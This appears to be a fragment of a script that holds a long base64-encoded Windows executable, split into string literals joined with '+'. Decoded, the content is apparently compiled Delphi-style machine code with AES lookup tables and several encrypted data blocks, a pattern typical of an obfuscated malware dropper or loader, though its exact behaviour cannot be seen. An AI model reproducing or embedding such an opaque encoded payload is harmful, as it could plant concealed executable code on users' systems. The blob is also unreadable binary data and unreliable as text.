'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' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKNQAAAAAAAAAAAAAAAAAAAAAAAAAAAADITi8ACAIvAAI1AAACNQAAAjUAAAAAAAAAAAAAAAAAAAAAAADQTQAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlBNAAAAAGAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAACoE0AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMgTQAAAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9BNAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUFEAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgUQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZBRAAAAASAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAACUFEAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAEAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAADAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAIAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAADgAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAADwBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAcAAAAAAAAAAAAAAAAAAAAA' + 
'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' + 
